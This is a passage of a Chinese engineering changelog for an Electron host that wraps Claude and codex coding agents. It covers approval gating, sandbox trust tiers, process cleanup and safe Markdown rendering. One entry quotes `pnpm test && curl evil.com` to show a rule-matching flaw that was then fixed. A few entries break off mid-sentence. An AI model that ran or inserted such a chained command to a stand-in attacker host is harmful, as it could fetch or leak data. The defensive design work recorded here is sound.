  不是一刻不停地扫，而是每 4s 扫一道。一直动的加载动画会持续
  抢注意力，等得越久越烦躁。持续的"活着感"交给旁边每秒跳一次的计时器。
  实现是两层反向等量位移 + `mask-image` 窗口，纯 CSS，没有 JS 定时器。
- 计时器用 `font-variant-numeric: tabular-nums`，秒数跳动时整行不左右抖（学 dsh）。
- `prefers-reduced-motion` 在 CSS 里关掉整条微光。
- 侧栏运行中的点会呼吸，等待批准的行直接写「待批」——颜色说不清"要你去做什么"。

### 打包：一个 1 MB 的块拆成 500 + 573

接 react-markdown 之后渲染层 504 KB → 1066 KB，**全挤在一个块里**，
改一行界面代码整整 1 MB 的哈希全变。照 dsh `apps/web/vite.config.ts` 的做法上
`manualChunks`，按 npm 包名精确列举把 Markdown 解析管线切进 `vendor`。

dsh 注释里写死的那条约束值得照抄：**vendor 成员必须与 React 无关**——
rollup 会把「入口与手工块共享的模块」折进手工块，只要有一个成员 import 了 react，
那份唯一的 react 就会被拖进 vendor，两个块都得重下，白拆。
实测 index 500 KB（含 React 与全部界面代码）/ vendor 573 KB，React 确实留在 index。

### 验证

三种状态各跑了一次真实会话截图：`正在思考 10s`（绿点呼吸）、
`等待批准 42s`（黄点 + 侧栏"待批" + 新审批卡）、收工后状态行消失且点转灰。
每次跑完 `ps` 都没有残留的 codex 进程。

## codex 驱动：归一化模型的第一次真检验 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（132 cases）+ 真实会话验证 + 零进程泄漏

**先取权威协议，再动手。** codex 自带 `codex app-server generate-ts --out DIR`，
生成 90+ 个文件、74 种服务端通知。不靠记忆、不靠猜。生成完先跑一次**活体探测**
（起进程、握手、发一轮、把每条消息落盘），因为类型只告诉你字段叫什么，
告诉不了你**它什么时候来、来不来**。两个关键结论都是探测出来的，类型里看不出来。

### 结论一：沙箱不是标签，它就是「问不问」的开关

Claude 的 `permissionMode` 只是路由开关，所以我们钉死 `default`，让每次调用都走
`canUseTool`，档位全部表达在 `@omni/approval` 里。**顺着这个经验去理解 codex 是错的。**

实测：`approvalPolicy: untrusted` + `sandbox: workspace-write`，往工作区里写文件
**根本不来问**——沙箱本来就允许，codex 没有理由问。同一次写，把 sandbox 换成
`read-only`，立刻变成一条 `item/fileChange/requestApproval` 送到客户端。

所以信任档必须落在 `sandbox` 上，落在 `approvalPolicy` 上没有意义：

| 档位 | sandbox | 结果 |
| --- | --- | --- |
| `read-only` | `read-only` | 任何写都来问 omni，omni 拒——档位真正生效 |
| `auto-edit` | `workspace-write` | 工作区内直接过，越界才问——正是这档的语义 |
| `full` | `workspace-write` | 同上，越界时由 omni 的 `full` 判定放行 |

`full` **不**升到 `danger-full-access`：那会把 OS 沙箱整个关掉。`full` 的意思是
「别拿日常操作烦我」，不是「把安全网撤了」——判定错了还有沙箱兜底。
反过来说，这也是 codex 比 Claude 强的一点：omni 判错了，系统还会拦一道。

### 结论二：审批请求只是一个引用，不含它要干什么

Claude 的 `canUseTool` 把工具名和完整参数一起递过来。codex 的
`item/fileChange/requestApproval` 只有 `{threadId, turnId, itemId, reason, grantRoot}`
——**没有路径、没有 diff、没有命令**。那些在此前那条 `item/started` 里。

驱动因此必须留一张在途 item 表。不留，就只能弹一张写着「要批准这个吗」
却说不出「这个」是什么的卡片——那比不弹更糟。写进 `approve.ts` 的头注释了。

顺带补了一个 `@omni/approval` 的真缺口：一个 `apply_patch` 可以同时改多个文件，
而 `classify` 只认单数的 `path` 键，**越界的第二个文件之后全都漏判**。
加了 `paths` 复数键。这是接第二家才暴露出来的。

### codex 白送的两样东西

- **`commandActions`**：codex 已经把命令解析成 read / listFiles / search，
  `sed -n '1,240p' math.js` 直接落 `file_read`，不用我们查表猜。
- **原生增量**：`item/agentMessage/delta` 让 `item.delta` 第一次真正用上
  （Claude 驱动至今走整块替换）。

### 空 item 的坑，第二次

codex 的 reasoning item 经常从头到尾是空的（没开推理摘要时）。在 `item/started`
就发出去，界面上会多一条看不见的 item，把连续的工具调用分组打断——
**和 Claude 的空 text 块一模一样的坑**。这次直接上通用策略：文本流式 item
**有内容才落地**（第一条 delta，或一条非空的 completed），由 `notify.ts` 执行。

### 其他

- `subprocess.ts` 脱掉了 Claude SDK 的类型。进程所有权是各引擎共用的，
  不该为某一家的 `SpawnedProcess` 背一个厂商 SDK；强转挪到 claude 驱动里。
- `rpc.ts` 做成纯粹的字节进字节出（`feed(chunk)` / `send(line)`），不碰子进程，
  所以没装 codex 的机器上也能跑全部协议测试。半行分帧、respond 幂等、
  close 落定在途请求，都有回归测试——最后一条尤其重要，
  一个永不 resolve 的 `call()` 会把 `dispose()` 顶死，和审批门 `settleAll()` 同一个教训。
- 界面上抓到一个由第二引擎暴露的谎言：顶栏显示 Codex，输入框的引擎选择器
  仍写着 Claude Code，而且点它什么也不会发生。改成两个选择器都读当前会话的真实值，
  换引擎 = 在同一工作区另开一个会话（会话中途接力还没实现，
  与其让控件点了没反应，不如让它做一件真做得到的事）。
- 回收阶梯对 codex 同样成立：真实会话跑完，`ps` 里没有残留的 `codex app-server`。

**遗留**：命令输出增量（`item/commandExecution/outputDelta`）没接，长命令跑着时
界面没有滚动；`setTrust` 改不了已开会话的 OS 沙箱（会发一条 `engine.status` 说明）。

## Markdown 渲染 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（86 cases）+ 真实会话验证

**选型是安全决策，不是口味决策。** 模型输出属于不可信内容，所以不用
`marked` / `markdown-it` + `dangerouslySetInnerHTML`——那条路要靠消毒环节做对。
选 `react-markdown`：它渲染成 React 元素而不是 HTML 字符串，**结构上不存在注入面**。
配 `remark-gfm` 拿表格、删除线、任务列表。

⚠️ 写进注释的红线：**永远不要加 `rehype-raw`**。那个插件的作用正是把原始 HTML
放回来，加上它这道结构性保证就没了。

**链接必须离开渲染层。** Markdown 里的链接如果就地导航，会把整个应用页面顶掉。
自定义 `a` 组件加 `target="_blank"` 走 `setWindowOpenHandler`，主进程再加一道
`will-navigate` 兜底——两条路都转给系统浏览器。

**两个排版 bug，都是静态样张跑出来的：**

1. **每个块级元素之间凭空多一整行。** `.msg--agent` 上留着 `white-space: pre-wrap`
   （字面量文本时代的遗产），而 Markdown 渲染出的是元素树——**标签之间的换行符
   被当成了真实换行**。agent/reasoning 去掉 pre-wrap，`.md` 再显式声明 `normal`
   不依赖上游；`.msg--user` 保留（用户打的是什么就显示什么）。
2. **表格散架成表头、表体两个独立的框。** 起因是给 `table` 自己加了
   `display: block` 想让它横向滚——那会让 thead/tbody 退化成普通块盒。
   改成外层 `.md__scroll` 容器滚动，table 保持 `display: table`。

排版迭代没有每次都跑真实会话：拿构建出的 CSS + 一份手写的代表性 DOM 做**静态样张**，
headless 截图 5 秒一轮。定稿后才跑一次真实会话确认 react-markdown 的实际产出一致。

**已知遗留**：代码块没有语法高亮（shiki 体积大、highlight.js 中等，要单独选型）；
渲染层包体从 504 KB 涨到 1,066 KB。

## 工具调用改扁平呈现 + 进程回收阶梯 · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（86 cases）+ 真实会话验证进程零泄漏

**UI：一摞方块 → 一段活动。** 原来每个工具调用一张带边框的卡片，四个调用就是四个盒子。
改成**共用左轨的扁平行**：`执行 ls -la ……… ok`，输出默认折叠，可展开的行带一个 `⌄` 提示
（避免「哪些能点」全靠猜）。连续的工具调用由 `groupRows()` 合成一组，
读起来是「一段活动」而不是「五个事件」。

改完第一次截图暴露了一个新问题：几组之间有莫名的空隙。原因是**只带工具调用的
assistant 消息常常附一个空文本块**，我们照单全收发成了 item——它不显示任何内容，
却把连续分组打断了。空文本 / 空 thinking 块现在直接丢弃，有回归用例。

顺带补了 `useStickToBottom`：新内容到达时滚到底，**但只在用户本来就贴着底时**。
无条件滚会在用户往回翻历史时把他弹走，比不滚更烦。判据用滚动位置而不是
「有没有手动滚过」——后者要多维护一份状态，且用户滚回底部后无法恢复跟随。

**进程回收阶梯。** SDK 有 `spawnClaudeCodeProcess` 钩子可以把 spawn 接管过来，
这才有整树退出证明可言。`subprocess.ts`：

1. `detached: true` 让子进程成为新进程组组长 → 能用负 pid 一次收掉整棵树
2. 关 stdin（SDK 自己有 ~2s 优雅窗口）→ 等消息循环自然收尾 → 才 abort
   （**提前 abort 会抢在 SDK 的优雅路径前面**，CLI 自己的优雅退出就没机会跑；
   这条写在 SDK 的 `SpawnOptions.signal` 注释里）
3. 还活着 → SIGTERM 进程组 → 等 → SIGKILL 进程组 → 等
4. `kill(-pid, 0)` 存在性探测作为**整树退出证明**——只看直接子进程的 exitCode 不够，
   claude 自己会 spawn bash 之类的孙子进程
5. 探测不到就报 `escaped`，**发一条 `engine.status: crashed` 出去，绝不吞**

6 条用例覆盖，其中两条是真进程：一个忽略 SIGTERM 的进程被正确升级到 SIGKILL；
一个 spawn 了孙子的进程整树被收干净。真实验证：连跑三次 live 会话，
前后 `pgrep claude` 计数 delta = 0。

取舍：`detached` 意味着 omni 硬崩时子进程不会被系统连坐带走。这是有意的——
换来的是可控的分级回收，而硬崩本来就没有优雅路径可言。

**已知遗留**：agent 回复里的 Markdown 没渲染（粗体、表格、代码围栏都是原文）；
`item.delta` 流式增量仍未接。

## 界面真跑起来，抓到三个只有跑起来才会现形的 bug · 2026-08-14

✅ typecheck / lint / arch / check:docs / test（73 cases）+ 真实 Electron 窗口跑真实 Claude 会话

加了一组**环境变量开关的开发钩子**（`apps/desktop/src/main/devtools.ts`）：
`OMNI_DEV_PROMPT` 自动发一条提示词、`OMNI_DEV_SHOT` 到点用

**三个 bug，单测一个都抓不到：**

1. **打包把 `electron` 的 npm 壳打进了产物。** 那个包是个「返回二进制路径的 CLI 壳」，

单测全绿，全链路 live test 也全绿——因为那些断言只看「有没有 tool_call」，
没看它最终是什么状态。

修完再跑一次，界面同时显示了 Claude 猜错路径的两次 `failed` 和改对后的两次 `ok`，

## 打通全链路：宿主 + 归约器 + Electron · 2026-08-14

✅ typecheck / lint / arch / docs / test（67 cases）+ **全链路 live test**

**新增两个包。**

`@omni/store`（L1，纯）—— 事件流 → 视图状态的归约器。**宿主与渲染层共用同一份**，
所以不会出现「宿主认为在跑、界面显示已完成」这类漂移。它单独成包而不是塞进
`@omni/host`，是因为渲染层不该为了一个纯函数把 Node 依赖打进浏览器包。

`@omni/host`（L3）—— 唯一允许做编排的地方。

**定下一条分工**：**宿主拥有 thread / turn 的身份，引擎拥有 item 的身份。**
prompt 是宿主发出的，所以宿主知道一轮什么时候开始，`turnId` 由它铸造并传给
`session.prompt(text, turnId)`；`turn.completed` 仍由引擎发，因为只有它知道自己
什么时候真收工。这条是写归约器时被逼出来的——原设计里引擎自己开轮次，
于是宿主发的用户消息因为「轮次还不存在」被归约器丢掉。

**审批闸的一个失败模式**：`dispose()` 必须先把挂着的审批**按拒绝落定**，
否则驱动会永远等在 `canUseTool` 里，`dispose()` 直接挂死。有专门用例守着。

**渲染层的显式失败态**：`window.omni` 不存在时不静默 no-op，而是渲染一条红色提示。
桥断了会表现成「界面全都在、点什么都没反应」，那是最难查的一类故障。

**闸门又拦下两个真问题**：`createHost` 104 行超 60 行上限 → 内部函数提到模块级、
用显式 `Ctx` 传递；`no-dynamic-delete` → `delete` 会改写传入对象，换成不可变的 `omit`。

**验证**：`pnpm test:live` 跑通全链路——宿主 → Claude 驱动 → 真实 claude 子进程 →
事件 → 归约器 → 视图状态，21 秒，用户消息与引擎产出落在同一条 transcript、
轮次正确收工。唯一没覆盖的是 Electron 的 IPC 与 React 渲染。

**已知遗留**：`thread.handoff` 未实现（命令明确报错而非静默）；无持久化，重启即丢；
`emit` 无背压；进程回收阶梯仍缺。

## 接入首个引擎：Claude Agent SDK 驱动 · 2026-08-14

✅ typecheck / lint / arch / docs / test（51 cases）+ **live test 真跑 claude 2.1.232**

**为什么先接 Claude**：审批设计的成败全押在 `canUseTool` 是否真的能承载外层策略上。
只有真接上 SDK 才能验证，验证不过则整套审批规格作废。

**实测推翻了两条纸面结论**（详见 `crew/docs/approval-spec-2026-08-14.md` §6.0）：

1. **`permissionMode` 必须三档统一固定为 `'default'`**，不能按信任档选。
   依据是 SDK `SDKPermissionDeniedMessage` 的文档：只有走到 `'ask'` 的决定才会经
   `can_use_tool` 交给宿主；`acceptEdits`/`bypassPermissions` 预先放行，
   `dontAsk`/`auto` 预先拒绝（`auto` 用模型分类器，宿主完全看不到）。
   **crew 用的正是 `auto`**——这解释了它为什么每个 Bash 都弹。
2. **`settingSources` 省略时是「全部加载」而非「静默 shadow」**。omni 默认不传（沿用 CLI 行为，
   保住 CLAUDE.md 与原生配置），`isolateSettings` 作为逃生口并写明代价。

**新增五条实现约束**：`matchedAskRule` 必须强制人工（引擎意见压过判定器，唯一一处）；
引擎给的文案 render-unsafe 必须消毒；UI 应优先用 SDK 的 `title`/`displayName`/`description`；
`suggestions → updatedPermissions` 是原生的「不再询问」；deny 规则与 `PreToolUse` hook
在 `canUseTool` 之前结算。

**落地**：`@omni/engine` = `contract.ts`（EngineDriver 契约）+ `claude/{permission,translate,loop,driver}.ts`
+ `queue.ts`（SDK 流式输入要 AsyncIterable，标准库没有可推入的）。
`permission.ts` 与 `translate.ts` 是纯函数，20 条表驱动用例覆盖。

**两次被闸门拦下**（都是真问题，不是误报）：`toolDetail` 圈复杂度 13 > 12 → 改表驱动；
控制字符正则触发 `no-control-regex` → 这次是正当用途，加了带理由的 scoped disable。

**已知遗留**：只翻译 `SDKMessage` 联合 38 个成员中的 4 类；流式增量（`stream_event`）未接，
transcript 目前是整块出现而非逐字；进程回收只有 `interrupt()` + `AbortController`，
缺 DSH 那套 EOF grace → SIGTERM → SIGKILL → 整树退出证明的阶梯，接第二个引擎前必须补。

## 建立新基线：TypeScript 单语言 + Electron · 2026-08-14

✅ typecheck / lint / arch / test（31 cases）

**背景**：上一版 `crew` 定位没收住 + 没有模块边界。实测数据：`cmd/crewd` 30 个生产文件
27,048 行全在 `package main`，`chat.go` 一个文件 9,282 行 / 238 函数，`runSuperviseFrom`
单函数 466 行；根目录 `CLAUDE.md` + `AGENTS.md` 合计 15 万字节；`NEED_HUMAN.md` 显示
2026-07-20 一天内几十条逐工具审批通知。产品把原生 agent 包在一层约束里，实测效果反不如直接用 codex。

**技术栈决策**：TypeScript 单语言 + Electron。决定性依据是三个协议的 SDK 现状——
Claude Agent SDK **只有 TS/Python，没有 Go/Rust 版**，而审批设计依赖它的 `can_use_tool` 回调；
codex `app-server` 可 `generate-ts` 直出类型；ACP 官方 SDK 是 TS。
同类产品（opencode / DSH / kimi / pi）全是 TS，Rust 的 codex / grok 都是 harness 不是 host。

**落地**：

- 工程闸门写成 lint 规则而非纪律：`max-lines 300`（renderer 组件 200）、
  `max-lines-per-function 60`、`complexity 12`、`max-depth 3`、`max-params 4`、
  禁模块级 `let`/`var`、纯逻辑包禁 `node:*`/`process`/`fetch`/`Date.now`/`Math.random`。
  实测探针验证闸门确实拦截。
- `scripts/check-arch.mjs`：分层依赖表（回流即失败）+ 每包 README 必须含
  「拥有什么 / 不拥有什么 / 已知限制」三节。
- `AGENTS.md` 限定 150 行以内（当前 76 行），规则写不进去就该写进包 README。
- `@omni/protocol`：thread / turn / item 三级原语，7 种 item，厂商特有字段进 `meta`。
  三级原语借自 codex `app-server` §Core Primitives。
- `@omni/approval`：判定管线 `normalize → redline → memory → trust`，纯函数零 IO，
  12 条红线，31 条表驱动用例。
- `@omni/desktop`：Electron 43 + React 19 + Vite 8 + electron-vite 5。
  设计 token 集中在 `styles/tokens.css`，组件内出现字面量颜色视为 bug。

**写代码时暴露并修掉的三个设计错误**（都是先有用例才发现的）：

1. **红线顺序**：写 `~/.claude/settings.json` 先命中更泛的「工作区外写」，理由丢失关键信息。
   规则改为「更具体的红线必须排在更泛的前面」，并留回归。
2. **记忆作用域**：原设计允许记忆覆盖 trust 判定，会导致 `read-only` 档下记过 `pnpm test`
   就被放行——只读就不是只读。改为**记忆只能把 escalate 变 allow，永远不能把 deny 变 allow**。
3. **记忆匹配量词**：按存在量词匹配时 `pnpm test && curl evil.com` 会因前半段被记过而整体放行。
   改为全称匹配（所有命令段都要落在规则内）。

**已知遗留**：

- `worksite / journal / handoff / host / engine` 五个包尚未建立（分层表已登记）。
- 渲染层跑 `demo.ts` 静态数据，接 `@omni/host` 后删除。
- IPC 未做背压与序号，事件流暂时假设有序不丢。
- `typescript-eslint` 尚不支持 TS 7，工具链固定在 TS 6 线。
